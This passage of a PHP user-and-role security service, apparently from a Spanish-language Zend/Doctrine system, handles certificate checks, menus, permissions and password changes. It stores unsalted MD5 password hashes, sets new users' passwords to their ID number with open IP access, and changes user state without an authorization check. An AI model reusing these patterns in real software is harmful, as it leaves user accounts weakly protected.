                    $sistemafunArr[$contador]['servidores'] = self::servidores(
                        $valor->id
                    );
                    $contador++;
                }
            }
            $funcionalidad = DatFuncionalidad::obtenerFuncionalidadess(
                $idsistema
            );
            if ($funcionalidad->getData() != null) {
                foreach ($funcionalidad as $valor) {
                    $sistemafunArr[$contador]['id'] = $valor->id . '_'
                        . $idsistema;
                    $sistemafunArr[$contador]['idfuncionalidad'] = $valor->id;
                    if ($externa[0]->externa) {
                        $ext = $externa[0]->externa;
                        $sistemafunArr[$contador]['referencia'] = 'http://'
                            . $ext . '/' . $valor->referencia;
                    } else {
                        $sistemafunArr[$contador]['referencia'] = '../../../'
                            . $valor->referencia;
                    }
                    $sistemafunArr[$contador]['icono'] = $valor->icono;
                    $sistemafunArr[$contador]['text'] = $valor->text;
                    $sistemafunArr[$contador]['leaf'] = true;
                    $contador++;
                }
            }
            if (count($sistemafunArr)) {

                return $sistemafunArr;
            } else {
                return array();
            }
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Carga sistemas, subsistemas y funcionalidades.
     * @method getAllSystemFunctionalities($certificate, $idsistema, $identidad)
     *
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador del sistema.
     * @param NUMERIC - Identificador de la estructura.
     *
     * @return JSON - Las funcionalidades de un subsistema.
     */
    public function getAllSystemFunctionalities(
        $certificate, $idsistema, $identidad
    )
    {
        $tmpidsistema = explode('_', $idsistema);
        if (count($tmpidsistema) >= 1) {
            $idsistema = $tmpidsistema[0];
        }
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        $acceso = self::getRol($idusuario, $identidad);
        $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
        $idrol = $rol[0]->idrol;
        $acceso = DatSistema::verificarrolsistema($idrol, $idsistema);
        if (count($acceso)) {
            $sistemas = DatSistema::getAllSistemasHijos($idsistema);
            $sistemas[count($sistemas)]["idsistema"] = $idsistema;
            $externa = DatSistema::buscarservidorweb($idsistema);
            $contador = 0;
            $sistemafunArr = array();
            if (count($sistemas)) {
                foreach ($sistemas as $sistema) {
                    $funcionalidad = DatFuncionalidad::obtenerFuncionalidadess(
                        $sistema["idsistema"]
                    );
                    if ($funcionalidad->getData() != null) {
                        foreach ($funcionalidad as $valor) {
                            $sistemafunArr[$contador]['id'] = $valor->id . '_'
                                . $idsistema;
                            $sistemafunArr[$contador]['idfuncionalidad'] = $valor->id;
                            if ($externa[0]->externa) {
                                $ext = $externa[0]->externa;
                                $sistemafunArr[$contador]['referencia'] = 'http://'
                                    . $ext . '/' . $valor->referencia;
                            } else {
                                $sistemafunArr[$contador]['referencia'] = '../../../'
                                    . $valor->referencia;
                            }
                            $sistemafunArr[$contador]['visible'] = $valor->visible;
                            $sistemafunArr[$contador]['icono'] = $valor->icono;
                            $sistemafunArr[$contador]['text'] = $valor->text;
                            $contador++;
                        }
                    }
                }
            }

            if (count($sistemafunArr)) {

                return $sistemafunArr;
            } else {
                return array();
            }
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * Obtener el id del sistema dado la denominacion
     * @method getIdSystemBydenominacion($denominacion)
     * @param $denominacion
     * @return NUMERIC - id del sistema
     */
    public function getIdSystemBydenominacion($denominacion)
    {
        return DatSistema::getIdsystemBydenominacion($denominacion);
    }

    /**
     * - Obtener los módulos para el portal tipo escritorio.
     * @method getSystemsDesktopModules($certificate, $identidad)
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador de la entidad a la que
     * accedió el usuario.
     *
     * @return ARRAY - Listado de módulos.
     */
    public function getSystemsDesktopModules($certificate, $identidad)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        if (count($datos)) {
            $idusuario = $datos[0]->idusuario;
            $acceso = self::getRol($idusuario, $identidad);
            $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
            /*$group = SegUtil::convertToUnidimensional(
                SegRolGrupo::obtenerGruposRol(array($rol[0]->idrol)), 'idgrupo'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $group);
            */

            $roles = SegRol::obtenerRolesGrupo(($rol[0]->idrol));
            $obj = SegUtil::convertToUnidimensional(
                $roles, 'idrol'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $obj);

            $sistemas = DatSistema::obtenersistemas($arrayIds);
            if (count($sistemas)) {
                foreach ($sistemas as $mdf) {
                    $resultado[] = self::subsistemas($mdf, $arrayIds);
                }


                return $resultado;
            } else {
                return array();
            }
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Función que retorna un listado con las funcionalidades a las que tiene acceso el usuario logueado.
     * @method getFunctionalitiesUser($certificate, $idusuario, $identidad)
     *
     * @param STRING - Certificado del usuario usuario.
     * @param NUMERIC - Id del usuario logeado.
     * @param NUMERIC - Id de estructura del usuario logeado.
     *
     * @return ARRAY - Listado con las funcionalidades a las que tiene acceso el usuario logueado.
     */
    public function getFunctionalitiesUser(
        $certificate, $idusuarioo, $identidad
    )
    {

        $resultado = array();
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);

        if (count($datos)) {

            $idusuario = $datos[0]->idusuario;
            $access = self::getRol($idusuario, $identidad);
            $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $access);
            /*$group = SegUtil::convertToUnidimensional(
                SegRolGrupo::obtenerGruposRol(array($rol[0]->idrol)), 'idgrupo'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $group);
            */

            $roles = SegRol::obtenerRolesGrupo(($rol[0]->idrol));
            $obj = SegUtil::convertToUnidimensional(
                $roles, 'idrol'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $obj);

            $sistemas = DatSistema::obtenersistemas($arrayIds);
            if (count($sistemas)) {
                foreach ($sistemas as $mdf) {
                    $aux = self::subsistemasfuncOtro($mdf, $arrayIds);
                    if ($aux != 0) {
                        $resultado = array_merge($resultado, $aux);
                    }
                }
            }
            return $resultado;
        }
    }

    /**
     * - Función que retorna un mensaje notificando la salva del ícono del sistema o funcionalidad.
     * @method safeIconMenu($obj, $icono, $identidad)
     *
     * @param STRING - Objeto.
     * @param STRING - Nombre del archivo de imagen .
     * @param STRING - Id de estructura del usuario logeado.
     *
     * @return JSON - JSON que contiene el mensaje de notificación de la salva del icono del sistema o funcionalidad
     */
    public function safeIconMenu($objeto, $icono, $identidad)
    {
        if ($objeto == 'funcionalidad') {
            if (DatSistema::guardarIconoFuncMenu($identidad, $icono)) {
                echo(
                    "{'codMsg':1,'mensaje':'El icono ha sido establecido"
                    . " satisfactoriamente.','success':true}"
                );
            }
        } else {

            if (DatSistema::guardarIconoSistemMenu($identidad, $icono)) {

                echo(
                    "{'codMsg':1,'mensaje':'El icono ha sido "
                    . "establecido satisfactoriamente.','success':true}"
                );
            }
        }
    }

    /**
     * -Obtener los módulos para el portal tipo escritorio.
     *
     * @method getSystemsFunctionsDesktopModules($certificate, $identidad)
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador de la entidad a la que
     * accedió el usuario.
     *
     * @return ARRAY - Listado de modulos.
     */
    public function getSystemsFunctionsDesktopModules($certificate, $identidad)
    {
        $resultado = array();
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        if (count($datos)) {
            $idusuario = $datos[0]->idusuario;
            $acceso = self::getRol($idusuario, $identidad);
            $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
            /*
            $group = SegUtil::convertToUnidimensional(
                SegRolGrupo::obtenerGruposRol(array($rol[0]->idrol)), 'idgrupo'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $group);
            */

            $roles = SegRol::obtenerRolesGrupo(($rol[0]->idrol));
            $obj = SegUtil::convertToUnidimensional(
                $roles, 'idrol'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $obj);

            $sistemas = DatSistema::obtenersistemas($arrayIds);

            if (count($sistemas)) {
                foreach ($sistemas as $mdf) {
                    $aux = self::subsistemasfunc($mdf, $arrayIds);
                    $auxiliar = array();
                    foreach ($aux['menu'] as $key => $row) {
                        $auxiliar[$key] = $row['index'];
                    }
                    array_multisort($auxiliar, SORT_ASC, $aux['menu']);
                    if ($aux != 0) {
                        $resultado[] = $aux;
                    }
                }
            }

            return $resultado;
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Verifica si un usuario tiene acceso a una entidad.
     * @method verifyAccessEntity($certificate, $identity)
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador de la entidad a la que
     * accedió el usuario.
     *
     * @return INTEGER - Devuelve 0 si no posee acceso y entero
     * mayor que 0 en caso de que si posea acceso.
     */
    public function verifyAccessEntity($certificate, $identity)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        $acceso = self::getRol($idusuario, $identity);
        if (self::usuarioEntidad($idusuario, $acceso)) {
            $roles = SegRol::obtenerrolesusuarioentidad($idusuario, $acceso);
            if (count($roles)) {
                return $roles [0]->idrol;
            } else {
                return '0';
            }
        }
    }

    /**
     * - Verifica si un usuario tiene acceso a una entidad.
     * @method verifyAccessEntity($certificate, $identity)
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador de la entidad a la que
     * accedió el usuario.
     *
     * @return MIXED
     */
    public function verificarAccesoEntidadRol($certificate, $identity)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        $acceso = self::getRol($idusuario, $identity);
        if (self::usuarioEntidad($idusuario, $acceso)) {
            $roles = SegRol::obtenerrolesusuarioentidad($idusuario, $acceso);
            if (count($roles)) {
                return array('idrol' => $roles [0]->idrol, 'identidad' => $acceso);
            } else {
                return null;
            }
        }
    }

    /**
     * - Obtiene un XML con la configuración para un usuario.
     * @method LoadXML($certificate, $identity)
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador de la entidad a la
     * que accedió el usuario.
     *
     * @return XML
     */
    public function LoadXML($certificate, $identity)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        if (count($idusuario)) {
            $acceso = self::getRol($idusuario, $identity);
            $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
            /*$group = SegUtil::convertToUnidimensional(
                SegRolGrupo::obtenerGruposRol(array($rol[0]->idrol)), 'idgrupo'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $group);
            */

            $roles = SegRol::obtenerRolesGrupo(($rol[0]->idrol));
            $obj = SegUtil::convertToUnidimensional(
                $roles, 'idrol'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $obj);

            $sistemas = DatSistema::obtenersistemas($arrayIds);
            if (count($sistemas)) {
                $menu = "<?xml version=\"1.0\" encoding=\"UTF-8\"<menu>";
                foreach ($sistemas as $mdf) {
                    self::subsistemasxml($mdf, $arrayIds, $menu);
                }
                $menu .= "</menu>";
                header('Content-Type: text/xml');
                echo $menu;

                return $menu;
            }
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Obtiene un XML con la configuración de un módulo dado para un usuario.
     * @method LoadXMLModule($certificate, $identity, $module)
     *
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param STRING - Módulo especificado.
     * @param NUMERIC - Identificador de la entidad a la que
     * accedió el usuario.
     *
     * @return XML
     */
    public function LoadXMLModule($certificate, $identity, $module)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        if (count($idusuario)) {
            $acceso = self::getRol($idusuario, $identity);
            $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
            $sistemas = DatSistema::obtenersistemasxml($rol[0]->idrol, $module)
                ->toArray(true);
            if (count($sistemas)) {
                $menu = "<?xml version=\"1.0\" encoding=\"UTF-8\"<menu>";
                foreach ($sistemas as $mdf) {
                    self::subsistemasxml($mdf, $rol[0]->idrol, $menu);
                }
                $menu .= "</menu>";
                header('Content-Type: text/xml');
                echo $menu;
            }
        }

        return '';
    }

    /**
     * - Devuelve los datos del perfil de usuario.
     * @method getUsersProfile($arrayusers, $certificate)
     * @param ARRAY - Identificadores de los usuario.
     * @param STRING - Certificado del usuario logeado.
     *
     * @return ARRAY - Listado con los datos del perfil del usuario.
     */
    public function getUsersProfile($arrayusers, $certificate)
    {
        $arrayPerfil = array();
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        if (count($datos) > 0) {
            foreach ($arrayusers as $key => $usuarios) {
                $perfil = SegUsuario::cargarperfilusuario($usuarios);
                if (is_array($perfil[0]['NomFila']['NomValor'])) {
                    foreach ($perfil[0]['NomFila']['NomValor'] as $valor) {
                        if ($valor['idfila']) {
                            $arraycampos = NomValor::cargarcamposdadovalores(
                                $valor['idvalor']
                            );
                            $arrayPerfil[$key][$arraycampos[0]
                            ['NomCampo']['nombre']] = $valor['valor'];
                        }
                    }
                }
                $arrayPerfil[$key]['idusuario'] = $usuarios;
                $arrayPerfil[$key]['idpersona'] = $perfil[0]['idpersona'];
                $arrayPerfil[$key]['usuario'] = $perfil[0]['nombreusuario'];
            }
        }

        return $arrayPerfil;
    }

    /**
     * - Devuelve las acciones de un usuario.
     * @method loadUserActions($certificate, $idfuncionalidad, $entity)
     * @param STRING - Certificado del usuario.
     * @param NUMERIC -  Identificador de la funcionalidad.
     * @param NUMERIC -  Identificador de la entidad.
     *
     * @return ARRAY - Listado con las acciones a las que el usuario tiene permiso.
     */
    public function loadUserActions($certificate, $idfuncionalidad, $entity)
    {
        $arracciones = array();
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        $acceso = self::getRol($idusuario, $entity);
        $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
        /*$group = SegUtil::convertToUnidimensional(
            SegRolGrupo::obtenerGruposRol(array($rol[0]->idrol)), 'idgrupo'
        );
        $arrayIds = array_merge(array($rol[0]->idrol), $group);*/

        $roles = SegRol::obtenerRolesGrupo(($rol[0]->idrol));
        $obj = SegUtil::convertToUnidimensional(
            $roles, 'idrol'
        );
        $arrayIds = array_merge(array($rol[0]->idrol), $obj);

        $accionesquetiene = DatRecurso::cargarRecursosService(
            $idfuncionalidad, $arrayIds
        );
        if (count($accionesquetiene)) {
            $direccion = 'http://' . $_SERVER['HTTP_HOST'] . '/'
                . 'report_generator.php/api/exportReport?id=';
            foreach ($accionesquetiene as $valores => $valor) {
                $arracciones[$valores]['idaccion'] = $valor->idrecurso;
                $arracciones[$valores]['abreviatura'] = $valor->abreviatura;
                $reportes = DatAccionDatReporte::cargaraccionesasociadasrep(
                    $valor->idrecurso
                );
                if (count($reportes)) {
                    foreach ($reportes as $rep => $valorrep) {
                        $arrayrep[$rep]['denominacion'] =
                            $valorrep['denominacion'];
                        $arrayrep[$rep]['url'] =
                            $direccion . $valorrep['idreporte'];
                        $arrayrep[$rep]['idreporte'] = $valorrep['idreporte'];
                    }
                    $arracciones[$valores]['reportes'] = $arrayrep;
                }
            }

            return $arracciones;
        } else {
            return $arracciones = array();
        }
    }

    /**
     * - Devuelve las acciones de un usuario en una entidad determinada.
     * @method loadUserActionsByID($certificate, $idfuncionalidad, $entity) -
     * @param STRING - Certificado del usuario.
     * @param NUMERIC -  Identificador de la funcionalidad.
     * @param NUMERIC -  Identificador de la entidad.
     *
     * @return ARRAY - Listado con las acciones a las que el usuario
     * tiene permiso en una entidad determinada.
     */
    public function loadUserActionsByID($certificate, $idfuncionalidad, $entity)
    {
        $arracciones = array();
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        $acceso = self::getRol($idusuario, $entity);
        $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
        if (count($rol) == 0) {
            $accionesquetiene = DatRecurso::cargarRecursosServiceByIdFunc(
                $idfuncionalidad
            );
            if (count($accionesquetiene)) {
                foreach ($accionesquetiene as $valores => $valor) {
                    $arracciones[$valores]['idaccion'] =
                        $valor['idrecurso'];
                    $arracciones[$valores]['abreviatura'] =
                        $valor['abreviatura'];
                    $reportes = DatAccionDatReporte::cargaraccionesasociadasrep(
                        $valor->idaccion
                    );
                    if (count($reportes)) {
                        foreach ($reportes as $rep => $valorrep) {
                            $arrayrep[$rep]['denominacion'] =
                                $valorrep['denominacion'];
                            $arrayrep[$rep]['url'] = $valorrep['idreporte'];
                            $arrayrep[$rep]['idreporte'] =
                                $valorrep['idreporte'];
                        }
                        $arracciones[$valores]['reportes'] = $arrayrep;
                    }
                }
            }
        }

        return $arracciones;
    }

    /**
     * - Devuelve las acciones de un usuario.
     * @method cargarAccionesXUri($certificate, $uri, $entity)
     * @param STRING - Certificado del usuario.
     * @param STRING -  Referencia de la funcionalidad.
     * @param NUMERIC -  Identificador de la entidad.
     *
     * @return ARRAY - Acciones de un usuario.
     */
    public function cargarAccionesXUri($certificate, $uri, $entity)
    {
        $arracciones = array();
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        $acceso = self::getRol($idusuario, $entity);
        $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
        $accionesquetiene = DatRecurso::cargarRecursosServiceByUri(
            $uri, $rol[0]->idrol
        );
        if (count($accionesquetiene)) {
            foreach ($accionesquetiene as $valores => $valor) {
                $arracciones[$valores]['idaccion'] = $valor->idrecurso;
                $arracciones[$valores]['abreviatura'] = $valor->abreviatura;
            }

            return $arracciones;
        } else {
            return $arracciones = array();
        }
    }

    /**
     * - Devuelve un listado con todos los roles de un usuario.
     * @method LoadUserRoles($certificate)
     * @param STRING - Certificado del usuario.
     *
     * @return ARRAY - Listado con todos los roles a los que pertenece
     * un usuario.
     */
    public function LoadUserRoles($certificate)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        $rolesuser = SegRol::obtenerrolesusuario($idusuario)->toArray();
        foreach ($rolesuser as $key => $rol) {
            $arrayresult[$key]['text'] = $rol['text'];
            $arrayresult[$key]['denominacion'] = $rol['text'];
            $arrayresult[$key]['id'] = $rol['id'];
            $arrayresult[$key]['idrol'] = $rol['id'];
            $arrayresult[$key]['abreviatura'] = $rol['abreviatura'];
        }

        return $arrayresult;
    }

    /**
     * - Devuelve el rol de un usuario en una entidad.
     * @method LoadUserRolByEntidad($certificate, $identidad)
     * @param STRING - Certificado del usuario.
     * @param NUMERIC - Identificador de la entidad.
     *
     * @return ARRAY - Listado con los datos del rol al que pertenece
     * un usuario en determinada estructura.
     */
    public function LoadUserRolByEntidad($certificate, $identidad)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        $rolesuser = SegRol::obtenerrolesusuarioentidad($idusuario, $identidad);
        $arrayresult = new stdClass();
        $arrayresult->idrol = $rolesuser[0]->id;
        $arrayresult->denominacion = $rolesuser[0]->text;
        $arrayresult->abreviatura = $rolesuser[0]->abreviatura;

        return $arrayresult;
    }

    /**
     * - Verifica si la entidad tiene roles o usuarios.
     * @method ExistUserRoles($entity)
     * @param STRING - Entidad.
     *
     * @return INTEGER - Retorna 1 en caso positivo 0 en caso contrario.
     */
    public function ExistUserRoles($entity)
    {
        $existe = DatEntidadSegUsuarioSegRol::existeusuariorol($entity);
        if ($existe) {
            return 1;
        } else {
            return 0;
        }
    }

    /**
     * - Cambia el estado de un usuario.
     * @method ChangeState($idusuario, $opcion)
     * @param NUMERIC - Id de usuario.
     * @param STRING - Estado del usuario (Uso o NO).
     *
     * @return INTEGER - Retorna 1 si cambia satisfactoriamente
     * el estado 0 en caso contrario.
     */
    public function ChangeState($idusuario, $opcion)
    {
        if ($opcion == '0') {
            $obj = Doctrine::getTable('SegUsuario')->find($idusuario);
            $obj->estado = '0';
            $obj->save();

            return 1;
        } elseif ($opcion == '1') {
            $obj = Doctrine::getTable('SegUsuario')->find($idusuario);
            $obj->estado = '1';
            $obj->save();

            return 1;
        }

        return 0;
    }

    /**
     * - Función para cambiar el contraseña a un usuario.
     * @method ChangePassword($usuario, $oldpass, $newpass)
     * @param STRING - Nombre de usuario.
     * @param STRING - Contraseña vieja.
     * @param STRING - Nueva contraseña.
     *
     * @return INTEGER - Retorna 1 en caso de operación satisfactoria.
     */
    public function ChangePassword($usuario, $oldpass, $newpass)
    {

        $verificar = SegUsuario::obtenerUsuario($usuario);
        $servidorAuth = DatServidor::getServidorAuth($verificar[0]->idusuario);
        if (count($servidorAuth) > 0) {
            self::changePasswordLdap(
                $servidorAuth[0], $usuario, $oldpass, $newpass
            );
            self::savePassw($verificar[0]->idusuario, $newpass);
        } else {

            $dirCerts = substr($_SERVER['DOCUMENT_ROOT'], 0, strrpos($_SERVER['DOCUMENT_ROOT'], 'web')) .
                'config' . DIRECTORY_SEPARATOR . 'certs' . DIRECTORY_SEPARATOR . 'auth' . DIRECTORY_SEPARATOR;
            $rsa = new ZendExt_Crypt_Rsa(new ZendExt_Crypt_Rsa_Config($dirCerts));
            $oldpass = md5($rsa->decrypt($oldpass));
            $newpass = $rsa->decrypt($newpass);


            if ($verificar[0]->contrasenna == $oldpass) {
                if ($this->verificarpass($newpass)) {
                    $newpass = md5($newpass);
                    if (!self::verificarHistorialClave(
                        $verificar[0]->idusuario, $newpass
                    )
                    ) {
                        throw new ZendExt_Exception('SEGCLAVES002');
                    }
                    // Actualiza el usuario.
                    $objusuario = Doctrine::getTable('SegUsuario')->find(
                        $verificar[0]->idusuario
                    );

                    $objusuario->contrasenna = $newpass;
                    $objusuario->caduca = date('d-m-Y');
                    $objusuario->save();
                    // Actualiza la última clave de acceso.
                    $datosClave = SegClaveacceso::obtenerDatosUltClave(
                        $verificar[0]->idusuario
                    );
                    /*$objModificar = Doctrine::getTable('SegClaveacceso')
                        ->find($datosClave[0]->idclaveacceso);
                    $objModificar->valor = false;
                    $objModificar->fechafin = date('d-m-Y');
                    $objModificar->save();*/
                    // Crea un nuevo registro en la tabla seg_claveacceso.
                    $objInsert = new SegClaveaccesoModel();
                    $caduca = $objInsert->insertar(
                        $verificar[0]->idusuario, $newpass
                    );
                    SegSession::deleteOpenedSessionByUser($user);
                    return $caduca;
                } else {
                    throw new ZendExt_Exception('SEG020');
                }
            } else {
                throw new ZendExt_Exception('SEG013');
            }
        }

        return 1;
    }

    /**
     * - Servicio para obtener todos los usuarios que desempeñen
     * el rol especificado en la entidad solicitada.
     * @method rolAsUsersGain($identidad, $idrol)
     *
     * @param NUMERIC - Identificador de la entidad.
     * @param NUMERIC - Identificador del rol.
     *
     * @return ARRAY - Listado que contiene los usuarios que desempeñen
     * el rol especificado en la entidad solicitada.
     */
    public function rolAsUsersGain($identidad, $idrol)
    {
        $arrayresp = array();
        $result = SegUsuario::cargarusuarios($identidad, $idrol);

        foreach ($result as $key => $usuarios) {
            $perfil = SegUsuario::cargarperfilusuario($usuarios['idusuario']);
            if (is_array($perfil[0]['NomFila']['NomValor'])) {
                foreach ($perfil[0]['NomFila']['NomValor'] as $valor) {
                    if ($valor['idvalor']) {
                        $arraycampos = NomValor::cargarcamposdadovalores(
                            $valor['idvalor']
                        );
                        $arrayresp[$key][$arraycampos[0]['NomCampo']['nombre']]
                            = $valor['valor'];
                    }
                }
            }
            $arrayresp[$key]['idusuario'] = $usuarios['idusuario'];
        }
        return $arrayresp;
    }

    /**
     * -Servicio para obtener todos los usuarios que desempeñen un rol
     * determinado.
     * @method getUserListWithRole($idrol, $limit = null, $start = null)
     *
     * @param NUMERIC - Identificador del rol.
     * @param INTEGER - Limite (Por defecto null).
     * @param INTEGER - Comienzo (Por defecto null).
     *
     * @return ARRAY - Listado que contiene todos los usuarios que desempeñen
     * un rol determinado.
     */
    public function getUserListWithRole($idrol, $limit = null, $start = null)
    {
        return SegUsuario::cargarListadoUsuarioPorRol($idrol, $limit, $start);
    }

    /**
     * -Retorna un listado de las entidades que pertenecen al dominio
     * del usuario logueado en las que este tiene un rol, especificando
     * las entidades que tienen rol y las que son cargos.
     * @method loadDomainPDO($idEstructura)
     *
     * @param NUMERIC - Id de la estructura.
     *
     * @return ARRAY - Listado de las entidades que pertenecen al dominio
     * del usuario logueado.
     */
    public function loadDomainPDO($idEstructura)
    {
        $global = ZendExt_GlobalConcept::getInstance();
        $integrator = ZendExt_IoC::getInstance();
        $idUser = DatEntidadSegUsuarioSegRol::cargarentidadesusuario(
            $global->Perfil->idusuario
        );
        $ident = SegUtil::convertToUnidimensiona($idUser, "identidad");

        return $integrator->metadatos->loadAllAccessDomain(
            $idEstructura, $ident
        );
    }

    /**
     * - Devuelve el nombre del usuario.
     * @method nameUsersProfile($user)
     * @param NUMERIC - Identificador del usuario.
     *
     * @return STRING - Nombre del usuario.
     */
    public function nameUsersProfile($user)
    {
        $datos = SegUsuario::nombusuario($user)->toArray();
        $nombre = $datos[0]['nombreusuario'];

        return $nombre;
    }

    /**
     * - Servicio que permite la inserción de un usuario.
     * @method insertarUsuarioUCID($user, $numid, $nombre, $papell, $sapell) -
     *
     *
     * @param STRING - Usuario.
     * @param INTEGER - CI.
     * @param STRING - Nombre del usuario.
     * @param STRING - Primer apellido.
     * @param STRING - Segundo apellido.
     *
     * @return INTEGER            - Identificador del usuario.
     */
    public function insertarUsuarioUCID(
        $user, $numid, $nombre, $papell, $sapell
    )
    {
        $tema = NomTema::cargarTema();
        $idioma = NomIdioma::cargarcomboidioma();
        $desktop = NomDesktop::cargarcombodesktop();
        $usuario = new SegUsuario();
        if ($user) {
            $usuario->nombreusuario = $user;
        } else {
            $usuario->nombreusuario = self::generarNombreUsuario(
                $nombre, $papell, $sapell
            );
        }
        $usuario->contrasenna = md5($numid);
        $usuario->ip = '0.0.0.0/0';
        $usuario->idtema = $tema[0]->idtema;
        $usuario->iddominio = 0;
        $usuario->ididioma = $idioma[0]->ididioma;
        $usuario->iddesktop = $desktop[0]->iddesktop;
        $usuario->idarea = '0';
        $usuario->identidad = '0';
        $usuario->idcargo = '0';
        $usuario->save();

        return $usuario->idusuario;
    }

    /**
     * - Devuelve le identificador del usuario dado el nombre.
     * @method obtenerIdUsuarioDadoNombre($nombreusuario)
     * @param STRING - Usuario.
     *
     * @return INTEGER            - Identificador del usuario.
     */
    public function obtenerIdUsuarioDadoNombre($nombreusuario)
    {
        $idusuario = SegUsuario::obtenerIdUsuarioDadoNombre($nombreusuario);

        return $idusuario;
    }

    /**
     * - Función para devolver los nombres de usuarios.
     * @method getUserNames($arrayid)
     * @param ARRAY - Listado de los id de usuario.
     *
     * @return ARRAY - Listado con los nombres de usuarios.
     */
    public function getUserNames($arrayid)
    {
        $arrayresult = array();
        foreach ($arrayid as $key => $idusuario) {
            $nombreusuario = SegUsuario::cargarperfilusuario($idusuario);
            $arrayresult[$key]['nombreusuario'] =
                $nombreusuario[0]['nombreusuario'];
        }

        return $arrayresult;
    }

    /**
     * - Devuelve verdadero si un usuario tiene acceso a una funcionalidad.
     * @method accessToFunctionality($certificate, $url, $identity)
     *
     * @param STRING - Token de seguridad.
     * @param STRING - Url.
     * @param NUMERIC - Identificador de la entidad.
     *
     * @return BOOLEAN
     */
    public function accessToFunctionality($certificate, $url, $identity)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        $acceso = self::getRol($idusuario, $identity);
        $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
        $acceso = DatFuncionalidad::accesoFuncionalidad($rol[0]->idrol, $url);
        if (count($acceso)) {
            return true;
        } else {
            return false;
        }
    }

    /**
     * - Devuelve verdadero si un usuario tiene acceso s una acción.
     * @method accessToAction($certificate, $denominacion, $identity)
     * @param STRING - Token de seguridad.
     * @param STRING - Denominación de la acción.
     * @param NUMERIC - Identificador de la entidad.
     *
     * @return BOOLEAN
     */
    public function accessToAction($certificate, $denominacion, $identity)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        if ($idusuario) {
            $access = self::getRol($idusuario, $identity);
            $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $access);
            $acceso = DatAccion::accesoAccion($rol[0]->idrol, $denominacion);
            if (count($acceso)) {
                return true;
            } else {
                return false;
            }
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Retorna todos los usuarios que pueden ser manipulados
     * por el usuario logeado.
